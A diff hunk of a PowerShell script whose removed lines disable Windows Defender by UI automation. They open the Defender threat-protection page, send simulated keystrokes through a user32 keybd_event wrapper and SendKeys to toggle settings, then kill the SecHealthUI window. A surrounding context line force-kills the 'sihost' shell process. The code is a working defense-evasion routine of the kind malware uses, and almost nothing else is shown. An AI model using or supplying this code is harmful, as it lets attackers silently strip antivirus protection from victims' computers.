@@ -37,60 +37,6 @@ kill -name 'sihost' -force
 sleep 2
 
 
-Start-Process -FilePath explorer.exe -ArgumentList windowsdefender://threat -WindowStyle Maximized 
-sleep 2
-
-
-$wshell = New-Object -ComObject wscript.shell
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Keyboard
-{
-    [DllImport("user32.dll")]
-    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
-}
-"@
-
-# Define key codes
-$VK_ALT = 0x12  # Alt key code
-$VK_SPACE = 0x20  # Space key code
-$VK_X = 0x58  # X key code
-
-# Simulate Alt+Space keystroke combination
-[Keyboard]::keybd_event($VK_ALT, 0, 0, 0)
-[Keyboard]::keybd_event($VK_SPACE, 0, 0, 0)
-Start-Sleep -Milliseconds 100  # Wait for a moment
-[Keyboard]::keybd_event($VK_SPACE, 0, 0x2, 0)
-[Keyboard]::keybd_event($VK_ALT, 0, 0x2, 0)
-
-# Press the 'X' key
-[Keyboard]::keybd_event($VK_X, 0, 0, 0)
-Start-Sleep -Milliseconds 100  # Wait for a moment
-[Keyboard]::keybd_event($VK_X, 0, 0x2, 0)
-
-
-
-sleep 2
-
-
-$wshell.SendKeys("{DOWN}")
-sleep .65
-$wshell.SendKeys("{DOWN}")
-sleep .65
-$wshell.SendKeys("{DOWN}")
-sleep .65
-$wshell.SendKeys("{DOWN}")
-sleep .65
-$wshell.SendKeys(" ")
-sleep .65
-$wshell.SendKeys(" ")
-
-sleep .75
-
-Stop-Process -name SecHealthUI
 
 
 
